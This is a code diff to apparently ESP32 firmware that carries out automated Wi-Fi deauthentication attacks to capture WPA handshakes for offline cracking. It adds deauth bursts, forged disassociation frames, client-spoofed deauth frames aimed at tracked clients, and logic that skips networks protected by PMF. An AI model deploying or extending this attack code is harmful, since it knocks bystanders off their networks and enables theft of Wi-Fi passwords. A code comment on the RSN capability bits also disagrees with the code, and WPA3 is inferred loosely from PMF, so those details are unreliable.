@@ -21,6 +21,7 @@ uint32_t OinkMode::lastScanTime = 0;
 std::vector<DetectedNetwork> OinkMode::networks;
 std::vector<CapturedHandshake> OinkMode::handshakes;
 int OinkMode::targetIndex = -1;
+uint8_t OinkMode::targetBssid[6] = {0};
 int OinkMode::selectionIndex = 0;
 uint32_t OinkMode::packetCount = 0;
 uint32_t OinkMode::deauthCount = 0;
@@ -158,9 +159,18 @@ void OinkMode::update() {
             break;
             
         case AutoState::NEXT_TARGET:
-            // Find next target that hasn't been attacked
+            // Find next target that hasn't been attacked and isn't PMF protected
+            while (selectionIndex < (int)networks.size()) {
+                if (!networks[selectionIndex].hasPMF) {
+                    break;  // Found a valid target
+                }
+                Serial.printf("[OINK] Skipping %s (PMF protected)\n", 
+                             networks[selectionIndex].ssid);
+                selectionIndex++;
+            }
+            
             if (selectionIndex >= (int)networks.size()) {
-                // All networks attacked, rescan
+                // All networks attacked or PMF, rescan
                 selectionIndex = 0;
                 autoState = AutoState::SCANNING;
                 stateStartTime = now;
@@ -176,17 +186,40 @@ void OinkMode::update() {
             autoState = AutoState::ATTACKING;
             attackStartTime = now;
             deauthCount = 0;  // Reset for this target
-            Serial.printf("[OINK] Auto-attacking: %s\n", networks[selectionIndex].ssid);
+            Serial.printf("[OINK] Auto-attacking: %s (%d clients)\n", 
+                         networks[selectionIndex].ssid,
+                         networks[selectionIndex].clientCount);
             break;
             
         case AutoState::ATTACKING:
-            // Send deauth packets
-            if (now - lastDeauthTime > 50) {  // 20 deauths per second
+            // Send deauth burst every 100ms (more effective than single packets)
+            if (now - lastDeauthTime > 100) {
                 if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                     DetectedNetwork* target = &networks[targetIndex];
+                    
+                    // Skip if PMF (shouldn't happen but safety check)
+                    if (target->hasPMF) {
+                        selectionIndex++;
+                        autoState = AutoState::NEXT_TARGET;
+                        break;
+                    }
+                    
                     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                    sendDeauthFrame(target->bssid, broadcast, 7);
-                    deauthCount++;
+                    
+                    // Burst broadcast deauth (3 packets)
+                    sendDeauthBurst(target->bssid, broadcast, 3);
+                    deauthCount += 3;
+                    
+                    // Also send disassoc
+                    sendDisassocFrame(target->bssid, broadcast, 8);
+                    
+                    // Target specific clients if we know any
+                    for (int c = 0; c < target->clientCount && c < 4; c++) {
+                        // Deauth specific client (more effective)
+                        sendDeauthBurst(target->bssid, target->clients[c].mac, 2);
+                        deauthCount += 2;
+                    }
+                    
                     lastDeauthTime = now;
                 }
             }
@@ -242,6 +275,17 @@ void OinkMode::update() {
                 ++it;
             }
         }
+        // Revalidate targetIndex after cleanup using stored BSSID
+        if (targetIndex >= 0) {
+            targetIndex = findNetwork(targetBssid);
+            if (targetIndex < 0) {
+                // Target was removed, clear it
+                deauthing = false;
+                channelHopping = true;
+                memset(targetBssid, 0, 6);
+                Serial.println("[OINK] Target network expired");
+            }
+        }
         lastScanTime = now;
     }
 }
@@ -261,7 +305,16 @@ void OinkMode::stopScan() {
 void OinkMode::selectTarget(int index) {
     if (index >= 0 && index < (int)networks.size()) {
         targetIndex = index;
+        memcpy(targetBssid, networks[index].bssid, 6);  // Store BSSID
         networks[index].isTarget = true;
+        
+        // Clear old beacon frame when target changes
+        if (beaconFrame) {
+            free(beaconFrame);
+            beaconFrame = nullptr;
+        }
+        beaconFrameLen = 0;
+        beaconCaptured = false;
         
         // Lock to target's channel
         channelHopping = false;
@@ -279,6 +332,7 @@ void OinkMode::clearTarget() {
         networks[targetIndex].isTarget = false;
     }
     targetIndex = -1;
+    memset(targetBssid, 0, 6);
     deauthing = false;
     channelHopping = true;
     Serial.println("[OINK] Target cleared, deauth stopped");
@@ -380,6 +434,9 @@ void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) 
     // BSSID is at offset 16
     const uint8_t* bssid = payload + 16;
     
+    // Detect PMF before anything else
+    bool hasPMF = detectPMF(payload, len);
+    
     // Capture beacon for target AP (needed for PCAP/hashcat)
     if (targetIndex >= 0 && !beaconCaptured) {
         DetectedNetwork* target = &networks[targetIndex];
@@ -405,6 +462,8 @@ void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) 
         net.lastSeen = millis();
         net.beaconCount = 1;
         net.isTarget = false;
+        net.hasPMF = hasPMF;
+        net.clientCount = 0;
         
         // Parse SSID from IE
         uint16_t offset = 36;
@@ -440,6 +499,39 @@ void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) 
             offset += 2 + ieLen;
         }
         
+        // Parse auth mode from RSN (0x30) and WPA (0xDD) IEs
+        net.authmode = WIFI_AUTH_OPEN;  // Default to open
+        offset = 36;
+        while (offset + 2 < len) {
+            uint8_t id = payload[offset];
+            uint8_t ieLen = payload[offset + 1];
+            
+            if (offset + 2 + ieLen > len) break;
+            
+            if (id == 0x30 && ieLen >= 2) {  // RSN IE = WPA2/WPA3
+                // Check for WPA3 (SAE in AKM suite)
+                // For simplicity, assume RSN = WPA2, PMF = WPA3
+                if (net.hasPMF) {
+                    net.authmode = WIFI_AUTH_WPA3_PSK;
+                } else {
+                    net.authmode = WIFI_AUTH_WPA2_PSK;
+                }
+            } else if (id == 0xDD && ieLen >= 8) {  // Vendor specific
+                // Check for WPA1 OUI: 00:50:F2:01
+                if (payload[offset + 2] == 0x00 && payload[offset + 3] == 0x50 &&
+                    payload[offset + 4] == 0xF2 && payload[offset + 5] == 0x01) {
+                    // WPA1 - only set if not already WPA2
+                    if (net.authmode == WIFI_AUTH_OPEN) {
+                        net.authmode = WIFI_AUTH_WPA_PSK;
+                    } else if (net.authmode == WIFI_AUTH_WPA2_PSK) {
+                        net.authmode = WIFI_AUTH_WPA_WPA2_PSK;
+                    }
+                }
+            }
+            
+            offset += 2 + ieLen;
+        }
+        
         if (net.channel == 0) {
             net.channel = currentChannel;
         }
@@ -447,28 +539,54 @@ void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) 
         networks.push_back(net);
         Mood::onNewNetwork(net.ssid, net.rssi, net.channel);
         
-        Serial.printf("[OINK] New network: %s (ch%d, %ddBm)\n", 
-                     net.ssid[0] ? net.ssid : "<hidden>", net.channel, net.rssi);
+        Serial.printf("[OINK] New network: %s (ch%d, %ddBm%s)\n", 
+                     net.ssid[0] ? net.ssid : "<hidden>", net.channel, net.rssi,
+                     net.hasPMF ? " PMF" : "");
     } else {
         // Update existing
         networks[idx].rssi = rssi;
         networks[idx].lastSeen = millis();
         networks[idx].beaconCount++;
+        networks[idx].hasPMF = hasPMF;  // Update PMF status
     }
 }
 
 void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
     if (len < 28) return;
     
+    // Extract addresses based on ToDS/FromDS flags
+    uint8_t toDs = (payload[1] & 0x01);
+    uint8_t fromDs = (payload[1] & 0x02) >> 1;
+    
+    const uint8_t* bssid = nullptr;
+    const uint8_t* clientMac = nullptr;
+    
+    // Address layout depends on ToDS/FromDS:
+    // ToDS=0, FromDS=1: Addr1=DA(client), Addr2=BSSID, Addr3=SA
+    // ToDS=1, FromDS=0: Addr1=BSSID, Addr2=SA(client), Addr3=DA
+    if (!toDs && fromDs) {
+        // From AP to client
+        bssid = payload + 10;      // Addr2
+        clientMac = payload + 4;   // Addr1 (destination = client)
+    } else if (toDs && !fromDs) {
+        // From client to AP
+        bssid = payload + 4;       // Addr1
+        clientMac = payload + 10;  // Addr2 (source = client)
+    }
+    
+    // Track client if we identified both
+    if (bssid && clientMac) {
+        // Don't track broadcast/multicast
+        if ((clientMac[0] & 0x01) == 0) {
+            trackClient(bssid, clientMac, rssi);
+        }
+    }
+    
     // Check for EAPOL (LLC/SNAP header: AA AA 03 00 00 00 88 8E)
     // Data starts after 802.11 header (24 bytes for data frames)
     // May have QoS (2 bytes) and/or HTC (4 bytes)
     
     uint16_t offset = 24;
-    
-    // Check ToDS/FromDS flags
-    uint8_t toDs = (payload[1] & 0x01);
-    uint8_t fromDs = (payload[1] & 0x02) >> 1;
     
     // Adjust offset for address 4 if needed
     if (toDs && fromDs) offset += 6;
@@ -529,6 +647,17 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
     } else {
         memcpy(bssid, dstMac, 6);
         memcpy(station, srcMac, 6);
+    }
+    
+    // M1 = AP initiating handshake = client reconnected after deauth!
+    // If we're deauthing this target, our deauth worked!
+    if (messageNum == 1 && deauthing && targetIndex >= 0) {
+        if (memcmp(bssid, networks[targetIndex].bssid, 6) == 0) {
+            // Deauth success - client is reconnecting!
+            Mood::onDeauthSuccess(station);
+            Serial.printf("[OINK] Deauth confirmed! Client %02X:%02X:%02X:%02X:%02X:%02X reconnecting\n",
+                         station[0], station[1], station[2], station[3], station[4], station[5]);
+        }
     }
     
     // Find or create handshake entry
@@ -606,6 +735,11 @@ uint16_t OinkMode::getCompleteHandshakeCount() {
 }
 
 void OinkMode::autoSaveCheck() {
+    // Check if SD card is available
+    if (!Config::isSDAvailable()) {
+        return;
+    }
+    
     // Save any unsaved complete handshakes
     for (auto& hs : handshakes) {
         if (hs.isComplete() && !hs.saved) {
@@ -766,6 +900,132 @@ void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uin
     deauthPacket[24] = reason;
     
     esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+}
+
+void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
+    // Send burst of deauth frames for more effective disconnection
+    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    
+    for (uint8_t i = 0; i < count; i++) {
+        // AP -> Client (pretend to be AP)
+        sendDeauthFrame(bssid, station, 7);  // Class 3 frame from non-associated station
+        
+        // Client -> AP (pretend to be client) - bidirectional attack
+        if (memcmp(station, broadcast, 6) != 0) {
+            // Only if not broadcast - swap source/dest
+            uint8_t reversePacket[26] = {
+                0xC0, 0x00,  // Frame Control: Deauth
+                0x00, 0x00,  // Duration
+            };
+            memcpy(reversePacket + 4, bssid, 6);     // To AP
+            memcpy(reversePacket + 10, station, 6);  // From Client
+            memcpy(reversePacket + 16, bssid, 6);    // BSSID
+            reversePacket[22] = 0x00;
+            reversePacket[23] = 0x00;
+            reversePacket[24] = 1;  // Unspecified reason
+            reversePacket[25] = 0x00;
+            esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
+        }
+    }
+}
+
+void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
+    // Disassociation frame - some clients respond better to this
+    uint8_t disassocPacket[26] = {
+        0xA0, 0x00,  // Frame Control: Disassoc (0xA0 instead of 0xC0)
+        0x00, 0x00,  // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
+        0x00, 0x00,  // Sequence
+        0x08, 0x00   // Reason code (Disassociated because station leaving)
+    };
+    
+    memcpy(disassocPacket + 4, station, 6);
+    memcpy(disassocPacket + 10, bssid, 6);
+    memcpy(disassocPacket + 16, bssid, 6);
+    disassocPacket[24] = reason;
+    
+    esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
+}
+
+void OinkMode::trackClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
+    int netIdx = findNetwork(bssid);
+    if (netIdx < 0) return;
+    
+    DetectedNetwork& net = networks[netIdx];
+    
+    // Check if client already tracked
+    for (int i = 0; i < net.clientCount; i++) {
+        if (memcmp(net.clients[i].mac, clientMac, 6) == 0) {
+            net.clients[i].rssi = rssi;
+            net.clients[i].lastSeen = millis();
+            return;
+        }
+    }
+    
+    // Add new client if room
+    if (net.clientCount < MAX_CLIENTS_PER_NETWORK) {
+        memcpy(net.clients[net.clientCount].mac, clientMac, 6);
+        net.clients[net.clientCount].rssi = rssi;
+        net.clients[net.clientCount].lastSeen = millis();
+        net.clientCount++;
+        
+        Serial.printf("[OINK] Client tracked: %02X:%02X:%02X:%02X:%02X:%02X -> %s\n",
+                     clientMac[0], clientMac[1], clientMac[2],
+                     clientMac[3], clientMac[4], clientMac[5],
+                     net.ssid);
+    }
+}
+
+bool OinkMode::detectPMF(const uint8_t* payload, uint16_t len) {
+    // Parse RSN IE to detect PMF (Protected Management Frames)
+    // RSN IE starts with tag 0x30
+    uint16_t offset = 36;  // After fixed beacon fields
+    
+    while (offset + 2 < len) {
+        uint8_t tag = payload[offset];
+        uint8_t tagLen = payload[offset + 1];
+        
+        if (offset + 2 + tagLen > len) break;
+        
+        if (tag == 0x30 && tagLen >= 8) {  // RSN IE
+            // RSN IE structure: version(2) + group cipher(4) + pairwise count(2) + ...
+            // RSN capabilities are at the end, look for MFPC/MFPR bits
+            uint16_t rsnOffset = offset + 2;
+            uint16_t rsnEnd = rsnOffset + tagLen;
+            
+            // Skip version (2), group cipher (4)
+            rsnOffset += 6;
+            if (rsnOffset + 2 > rsnEnd) break;
+            
+            // Pairwise cipher count and suites
+            uint16_t pairwiseCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
+            rsnOffset += 2 + (pairwiseCount * 4);
+            if (rsnOffset + 2 > rsnEnd) break;
+            
+            // AKM count and suites
+            uint16_t akmCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
+            rsnOffset += 2 + (akmCount * 4);
+            if (rsnOffset + 2 > rsnEnd) break;
+            
+            // RSN Capabilities (2 bytes)
+            uint16_t rsnCaps = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
+            
+            // Bit 6: MFPC (Management Frame Protection Capable)
+            // Bit 7: MFPR (Management Frame Protection Required)
+            bool mfpc = (rsnCaps >> 7) & 0x01;
+            bool mfpr = (rsnCaps >> 6) & 0x01;
+            
+            if (mfpr) {
+                return true;  // PMF required - deauth won't work
+            }
+        }
+        
+        offset += 2 + tagLen;
+    }
+    
+    return false;
 }
 
 int OinkMode::findNetwork(const uint8_t* bssid) {
